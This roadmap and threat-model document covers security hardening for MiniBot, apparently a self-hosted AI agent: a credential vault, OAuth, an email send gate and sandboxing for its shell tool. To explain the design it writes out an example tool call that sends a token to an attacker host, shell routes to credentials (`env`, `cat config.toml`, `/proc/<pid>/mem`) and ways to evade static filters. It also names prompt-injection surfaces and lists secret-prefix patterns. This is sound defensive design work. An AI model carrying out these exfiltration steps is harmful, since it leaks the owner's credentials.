# Roadmap

Possible roadmap to follow now...

## Trust model

Security here isn't a property of the software alone — it's the combination
of which tools are enabled, where MiniBot runs, what credentials it's given,
how trusted the inputs are, and what the blast radius of a tool doing the
wrong thing actually is. A fairly permissive `bash` is a reasonable choice
inside a disposable VM/container with no valuable credentials and a personal
Telegram account; the same tool is a very different risk next to `~/.ssh`,
cloud credentials, or LAN access.

MiniBot's job is not to make it impossible for the agent to do damage — that
would mean rebuilding a sandbox platform inside the agent, a race it can't
win against dedicated isolation tooling. The goal is **safe defaults,
explicit escape hatches, a documented trust model** — not an implicit
guarantee the software can't actually make.

- **MiniBot's own responsibility**: safe-by-default config
  (`bash.pass_parent_env = false`), secrets never reaching the LLM (Phase 1),
  guardrails on consequential actions (Phase 4's SMTP gate, Phase 5). These
  matter *regardless of deployment*, because the LLM provider itself — the
  remote API — sees whatever ends up in tool-call arguments and context, no
  matter how isolated the host is. No amount of sandboxing the process
  protects against that; only not putting the secret there in the first
  place does. This is why the vault stays high priority even for an owner
  who already runs MiniBot in a throwaway VM.
- **Deployment's responsibility**: OS/filesystem/process isolation for
  `bash`/`python_exec` (Phase 6's jail/container options). An owner who
  already isolates the host can reasonably set `sandbox_mode = "none"` and
  accept the ambient risk — that's a valid choice, not a bug to prevent.

Worth stating this plainly in the README/docs, roughly:

> MiniBot can execute powerful tools such as shell commands and Python code.
> It is not intended to be a security boundary by itself. For untrusted
> workloads or deployments with sensitive host data, run MiniBot inside an
> appropriately isolated environment.

## [x] Phase 0 — fix bash's env default now (no dependency on anything else)

`BashToolConfig.pass_parent_env` defaults to `True`
(`minibot/adapters/config/schema.py:572`), so `bash` inherits the daemon's
entire process environment today, vault or no vault — any `${ENV_VAR}`
secret already used for config (`GITHUB_TOKEN`, static MCP header tokens, DB
URLs) is retrievable right now via `bash` → `env`. Flip the default to
`False` with an explicit `env_allowlist`, matching `python_exec`'s existing
default (`schema.py:560-561`) — `bash` is the outlier, not the norm. Small,
immediate, and a prerequisite for Phase 1's `MINIBOT_VAULT_PASSWORD` unlock
option to be trustworthy at all.

## [x] Phase 1 — Credential vault (reference-only)

Single owner, no per-owner scoping — MiniBot is a personal assistant for one
person, not multi-tenant. `owner_id` shows up throughout `ToolContext` today
as a legacy hook but is expected to go away; don't design new storage around
it.

Foundation for everything below. LLM never sees secret values, only reference
tokens (`secret://name`); real values are resolved outside the LLM loop, right
before the outbound call.

A plain SQLite row (even encrypted) doesn't hold up on its own: `bash` and
`python_exec` run as the same OS user as the daemon, so anything readable by
that user is readable by the LLM's own tools. The boundary that actually
matters is: the encryption key must never touch disk or a subprocess env, only
live in the trusted adapter's memory.

Ansible-vault-style design, shipped as an optional extension (not core):

- Single encrypted file (`secrets.vault.yml` by default), AES-256-GCM via
  `cryptography` (new poetry extra `vault = ["cryptography"]` — stdlib has no
  AES; don't hand-roll a cipher).
- Key derived from a password via scrypt/PBKDF2 + a stored salt. Supplied
  once at daemon startup. **Interactive prompt is the recommended, safe-by-
  default method for v1** — no password or key material ever touches disk.
  `--vault-password-file` and `MINIBOT_VAULT_PASSWORD` are supported but not
  on equal footing — ship with an explicit warning: Phase 0 only fixes env
  inheritance, it says nothing about `--vault-password-file`, which stays
  exposed to `bash` reading it directly off disk (no cwd jail at all — see
  Phase 6) regardless of Phase 0. Both alternate methods stay a real risk
  until Phase 6's filesystem isolation lands, not just the env-var one.
  Whichever method is used, that password/file becomes the thing to protect
  instead.
- CLI helper `minibot vault edit <path>` — like `ansible-vault edit`:
  decrypt to a 0600 temp file, launch `$EDITOR`, re-encrypt on exit, shred the
  temp file. This is how the owner writes secrets; the LLM never gets a
  write path either.
- LLM-facing tool surface: `list_secrets()` (names only). No `get_secret`
  tool at all.
- **Secrets are destination-bound, not LLM-referenceable.** A `secret://name`
  string must never be something the LLM writes into a tool argument that a
  generic executor then substitutes — that would turn the vault into a
  decryption oracle any tool call could invoke, e.g.
  `http_request(url="https://evil.example", headers={"Authorization":
  "secret://github"})` exfiltrates the token to an attacker-chosen
  destination without the LLM ever seeing the value. Instead, an admin binds
  a secret to a specific destination in config: `MCPClient` resolves its own
  server's stored token internally (server/issuer come from config, not LLM
  input); the SMTP adapter resolves its own configured credential the same
  way. `http_client` gets **no generic vault access** in v1 — either no
  vault-backed auth at all for that tool, or, if a real need shows up later,
  a `[tools.http_client.credentials]` domain-allowlist that the adapter
  checks against the *actual request host*, attaching the header itself
  when it matches. The LLM never writes or sees a secret reference either
  way.
- **Deferred to Phase 3**, where this is restated concretely:
  `execute_tool_calls_for_runtime` (`minibot/llm/services/tool_executor.py`)
  is the choke point for the *other* side of this — redacting any known
  secret value out of a `ToolResult` (and logs) before it reaches the LLM.
  Not shipped in Phase 1: the same exfil-via-echo risk already exists
  un-redacted today for `${ENV_VAR}` static MCP headers, so Phase 1 does not
  widen it, and threading a redactor through `LLMClientFactory` →
  `LLMClient` → the executor before Phase 3 knows its shape is premature.
  The "reject a call whose target isn't the bound destination" half is moot
  under the destination-bound model — nothing resolves at the executor, so
  there is no call to reject. It is a literal containment/redaction check
  against known vault values, not semantic classification, so it's allowed
  under the project's output-classification rule either way.

Shipped differently from the sketch above, deliberately:

- Lives in `minibot/adapters/vault/` with a `[vault]` config section, not an
  out-of-tree extension — MCP header binding is core code an extension can't
  reach. "Optional" is the `vault` poetry extra plus `enabled = false`, the
  same shape `rag`/`stt` use. Only the `list_secrets` tool is an extension
  (`minibot/extensions/tools/vault.py`).
- No PyYAML. The plaintext is a flat `name: value` document parsed by
  `adapters/vault/secrets_yaml.py` (~50 lines, string-only — never coerces a
  numeric API key to `int`, which is why `shared/frontmatter.py` could not be
  reused). Values needing whitespace/newlines are JSON-quoted; no block
  scalars.
- The envelope is `{version, kdf, n, r, p, salt, nonce, ciphertext}` JSON;
  scrypt comes from stdlib `hashlib`, only `AESGCM` from `cryptography`.
- `--vault-password-file` is `[vault] password_file` for the daemon (the
  daemon path parses no args, and the field is already `${ENV}`-expandable).
  The `--password-file` flag exists on `minibot vault`, where scripting
  needs it.

~~Out of scope for this vault: today's `${ENV_VAR}` config-time secrets
(`token_env`, static MCP headers). Different threat model — admin-authored,
live only in `config.toml`, never handled through tool arguments.~~

**Corrected after Phase 1 shipped.** It is *not* a different threat model:
`bash` has no filesystem jail, so `cat config.toml` reaches every plaintext
credential in it. A `${secret:NAME}` reference form was therefore added,
resolvable in any config string from the vault (`adapters/config/environment.py`),
so the file on disk holds only references. `${ENV_VAR}` still works and the
two coexist; no migration is forced. The remaining exposure is unchanged for
both: a resolved value lives in the daemon's memory.

Ceiling: this protects secrets at rest and from the LLM's own tool calls. It
does not protect against a fully compromised daemon process reading its own
memory (e.g. `/proc/<pid>/mem`) — same trust boundary as any self-hosted
secret manager running as one OS user. Out of scope unless that threat model
changes.

## [ ] Phase 2 — Native skills & runtime self-knowledge

Detailed design: [`native_skills.md`](native_skills.md).

Different theme from the phases around it — capability, not containment —
but it lands two new LLM-facing surfaces, so the Trust model above still
applies (see the end of this section).

A fresh install ships **zero** skills, so `[tools.skills]` looks empty until
the owner hand-authors one, and the agent has no in-band way to learn where
it may write a new skill: `activate_skill` returns the `skill_dir` of an
existing skill and nothing else.

Ship a small set of skills inside the package (`minibot/skills/`) on a third
discovery tier, ranked below project- and user-level so a hand-written skill
of the same name always wins. It must be independent of `[tools.skills]
paths`, which *replaces* the default discovery list today
(`app/skill_definitions_loader.py:31`) and would otherwise delete the bundled
skills silently. Gated by the existing `[tools.skills] enabled`, plus a
`native` master switch and a `native_disabled` opt-out list, so the default
needs no config and turning one off is one line.

v1 set, chosen for self-improvement and self-knowledge:

- `create_skill` — authoring, including the places MiniBot's parser is
  stricter than the agentskills.io spec (flat `key: value` frontmatter, not
  real YAML; an empty body is a silent drop).
- `import_skill` — fetch from GitHub and generic archives through a
  stdlib-only Python helper. No node, no new Poetry dependency. Maintains a
  `skills-lock.json` in the shape the npm `skills` tool already writes.
- `minibot_docs` — answers "how does MiniBot work" from the published
  `llms.txt` (2.7 KB) and the Sphinx `_sources/*.rst.txt` RST, which beats
  scraping rendered HTML. It must never answer a configuration-*state*
  question from documentation; that is what `get_settings` is for.
- `create_agent` — specialist authoring, where the tool-scoping rules are
  counterintuitive enough to be worth writing down: with neither
  `tools_allow` nor `tools_deny` set an agent gets **zero** non-MCP tools
  (`app/agent_policies.py:48`), and `tools_allow` is never consulted for an
  MCP name.

Three supporting changes, each small:

- **`get_settings`** — a read-only core tool answering "what am I actually
  running?", sibling to `chat_history_info`. Emits only sections that are
  enabled, so absence is itself the answer.
- **`AgentRegistry` hot reload** — skills re-read on an mtime/size
  fingerprint (`app/skill_registry.py:55`); agents do not re-read at all, so
  a freshly written specialist is invisible until restart. Mirror the skill
  registry's `refresh_if_stale()`; `replace_all()` already proves the
  registry keeps its identity across a swap.
- **Single-source the version** — `minibot/__init__.py:1` says `0.1.0` while
  `pyproject.toml` says `0.16.0`; the constant is referenced nowhere else,
  which is how the drift survived. Read it from installed distribution
  metadata (`importlib.metadata.version`), then surface version and resolved
  config path in `build_environment_prompt_fragment`.

Trust model, for the two new surfaces:

- `get_settings` reads `Settings`, which holds `bot_token`, `api_key`,
  `auth_secret`, `basic_auth_password` and credential-bearing URLs. It must
  use an explicit **field allowlist**, never a denylist — a denylist leaks
  whatever secret field is added to `schema.py` next. `is_sensitive_argument_key`
  (`llm/services/tool_executor.py:138`) exists but is a key-substring
  denylist built for log sanitizing; wrong shape for a surface the model
  reads. The test that matters is a sentinel-leak test, not a field list
  review.
- `import_skill` installs instructions the agent will later follow, which is
  a prompt-injection surface by construction. Never auto-activate after
  import; show the parsed name, description and resolved source URL; require
  explicit owner confirmation for a source the owner did not name.

## [ ] Phase 3 — MCP OAuth (issue #65)

Scope: alternative 1 only (auth-code + PKCE + manual callback paste). No HTTP
callback endpoint, no device flow.

Target the MCP authorization spec `2026-07-28` (confirmed via
`blog.modelcontextprotocol.io/posts/2026-07-28/`), not a generic OAuth
implementation that happens to work against two test servers:

- Validate the `iss` parameter (RFC 9207) before redeeming an authorization
  code — closes the authorization-server mix-up hole the spec calls out.
- Credentials are bound to the issuing authorization server and must not be
  reused across issuers — this is a hard constraint from the spec, not just
  good hygiene, so token storage should key by issuer, not just server name.
- Dynamic Client Registration is deprecated in favor of Client ID Metadata
  Documents (CIMD) but still functional for backward compatibility — prefer
  CIMD where a server advertises support, fall back to DCR otherwise.

- `MCPClient` (`minibot/adapters/mcp/client.py`) catches `401` on HTTP
  transport, runs MCP OAuth discovery, holds PKCE state.
- Resulting tokens stored in the Phase 1 vault, keyed by
  `(server_name, issuer)` — issuer is the binding that actually matters per
  the spec constraint above; `server_name` is bookkeeping on top of it.
- `_build_http_headers` resolves the vault reference into the `Authorization`
  header at request time.
- Owner-only admin surface (not an LLM tool) to present the auth URL and
  accept the pasted callback, via Telegram authorization.

- Output-side redaction is the one place this matters most: nothing stops a
  resolved secret coming *back* in a tool result (an API that echoes the
  `Authorization` header in an error message, an SMTP server's debug reply)
  and landing in `ToolResult.content` — which flows into LLM context, then
  conversation memory (SQLite), then compaction summaries, permanently. This
  is the redaction check from Phase 1's tool-executor bullet, applied here
  concretely.
- MCP token refresh has no lock. `MCPClient` is per-server with no mutex
  around refresh — two tool calls near token expiry could both refresh
  concurrently; some providers invalidate the old refresh token when issuing
  a new one, so the loser of that race gets locked out. Needs a lock keyed by
  `(server_name, issuer)`.
- Vault file needs `.gitignore` treatment, same as `data/kv_memory.db` — keep
  it out of git and out of the docker build context by default.
- No rotation/recovery, no hot-reload, stated as explicit non-goals for v1
  (same limits ansible-vault has): forgotten password means starting over;
  editing the vault file while the daemon is running requires a restart to
  pick up the change.

## [ ] Phase 4 — SMTP tool

- `SMTPToolConfig` next to `HTTPClientToolConfig`.
- Credentials bound to the SMTP adapter per Phase 1's destination-bound
  model (config-supplied, not an LLM-writable reference).
- No new credential-handling code — reuses Phase 1 vault.
- Sending mail is more consequential than an HTTP GET (irreversible,
  externally visible, a classic prompt-injection target). MiniBot has no
  existing generic action-approval mechanism today, so don't build one for
  this — keep it SMTP-scoped: a minimal confirm-before-send gate (e.g. an
  owner-facing Telegram confirmation, or a `dry_run` default) rather than a
  cross-cutting approval framework.

## [ ] Phase 5 — Guardrail enhancements

Not a duplicate of Phase 1. Under the destination-bound model, the LLM never
has a `secret://` reference to put in an argument at all, so there's nothing
in Phase 1 checking argument *content* for known vault values — its
redaction check only runs on tool *results*. This phase covers the input
side: a secret that entered the conversation another way entirely (the user
pastes a raw API key into chat instead of storing it, or the LLM produces
something secret-shaped) and could otherwise get echoed into a later tool
call's arguments:

- `ToolGuardrailValidator` gains a check for secret-*shaped* values in
  arguments — entropy/prefix heuristics (`sk-`, `ghp_`, long high-entropy
  tokens), independent of whether the value matches a known vault entry.
- `GuardrailDecision` gains a `credential_exposure` field (structured, not
  regex/text classification, per project convention).

## [ ] Phase 6 — bash tool hardening (mixed priority — see Trust model)

Two different things live in this phase, deliberately split by who owns
them:

- **The AST pre-filter below**: MiniBot's job, worth doing on a similar
  timeline to the other security phases. It's cheap, deterministic, and
  catches accidental destructive commands too, not just adversarial ones —
  useful even inside a fully-isolated deployment.
- **The OS-level containment options at the end (1-3)**: per the Trust
  model above, this is the deployment's job, not something MiniBot's
  roadmap should try to fully solve by building a sandbox platform into the
  agent. Kept here as documented options for an owner who wants MiniBot
  itself to add a layer, not as a committed deliverable.

Everything below assumes secrets are safe from `bash` as long as they never
appear as plaintext arguments or in a file it can read. That assumption
doesn't hold today:

- ~~`BashToolConfig.pass_parent_env` defaults to `True`, so the LLM's `bash`
  tool inherits the daemon's *entire* process environment~~ — fixed in Phase 0;
  the default is now `False` with an `env_allowlist`. An owner who sets
  `pass_parent_env = true` back (as `config.yolo.toml` does) still exposes every
  `${ENV_VAR}` config secret to `bash` → `env`.
- `bash`'s `cwd` (`_coerce_cwd`, `bash.py:176-185`) accepts any existing
  directory on the filesystem — there's no root jail at all, unlike
  `LocalFileStorage` (`adapters/files/local_storage.py:339-348`), which
  refuses to resolve a path outside its managed root by default.
- `python_exec` already has a `sandbox_mode` field (none/basic/rlimit/cgroup/
  jail) and a working `jail` implementation that just prepends a configurable
  `command_prefix` (e.g. `bwrap`, `firejail`, `nsjail`) to the command
  (`python_exec.py:679-684`, `PythonExecJailConfig.command_prefix`). `bash`
  has none of this — no `sandbox_mode`, no rlimits, no jail wrapper.

Prior art check: some coding-agent tools embed a Rust shell interpreter
(a bash-compatible engine) plus Rust reimplementations of common utilities
for their bash tool. Worth naming clearly: **that buys performance and
cross-platform parity, not containment.** Their own docs say so directly —
"Pattern approval is not containment. Once approved, a process keeps the
shell's ambient filesystem, network, and subprocess access." Their actual
safety layer is policy (curated non-interactive env defaults, allow/deny
command patterns, an interceptor that reroutes risky raw commands to
dedicated tools) on top of an unsandboxed subprocess — same ceiling `bash`
already has here. Not a shortcut past this phase's real question.

### Pre-execution static analysis (a filter, not a replacement for sandboxing)

Parse the proposed command into a real shell AST before running it — not
regex on raw text, which has known blind spots (heredocs, substitutions, and
malformed quoting can bypass a regex-based fragment splitter). Candidates,
not decided: `bashlex` (pure Python, no native extension) or `tree-sitter` +
`tree-sitter-bash` (heavier, more complete grammar). Walking the AST gives
deterministic structural signals — command names, redirect targets,
`eval`/`source`/process-substitution/decode-and-exec shapes — which is
protocol/format parsing, not semantic classification, so it fits the
project's existing rule against text-matching for intent.

Deliberately **not** a small ML classifier (a "mini BERT" or similar) for
this: a security gate needs to be auditable ("blocked: calls `eval` with a
command substitution", not "scored 0.73"), and this is an adversarial
setting — a learned classifier is exactly the weakest thing to put in front
of a malicious/injected command, whereas an AST node either is an `eval`
call or it isn't.

Ceiling: static analysis of arbitrary shell is fundamentally incomplete —
dynamic reconstruction (`eval "$(echo ...)"`, `${!VAR}` indirection,
base64-decode-then-exec) can slip past any static analyzer, parser-based or
ML-based. This is a fast pre-filter for the common dangerous shapes, run in
front of whatever containment option below is chosen — not a substitute for
one.

Options for an owner who wants MiniBot to add its own containment layer on
top of deployment-level isolation (not decided, not a committed
deliverable — see Trust model):

1. Port `python_exec`'s existing `sandbox_mode`/jail-wrapper pattern onto
   `BashToolConfig` — smallest diff, reuses infrastructure already in the
   codebase, relies on an external jail tool (bubblewrap/firejail/nsjail)
   the owner installs. Note: `python_exec`'s own jail mode ships with an
   empty `command_prefix` today (`config.example.toml:434-436`, comment
   mentions Firejail but no working example) — porting this to `bash`
   should ship a real example for both, not just plumbing.
2. A custom Rust supervisor binary wrapping the shell exec, giving tighter
   control (seccomp filters, mount namespaces, capability dropping) than a
   generic jail wrapper — but net-new development, plus a build/distribution
   burden (a compiled binary per platform) for a self-hosted, pip/poetry-
   installed project.
3. Containerize tool execution itself (run `bash`/`python_exec` inside a
   throwaway container per call) — strongest isolation, biggest change to
   the deployment model (today MiniBot assumes a plain host process).

(The env-inheritance half of this is already fixed in Phase 0 — what's left
here is the harder, undecided part: filesystem/process isolation.)

## Explicitly deferred

- MCP OAuth HTTP callback endpoint (issue #65 alternative 2).
- MCP OAuth device flow (issue #65 alternative 3).

Add either only if a remote MCP server actually in use requires it.
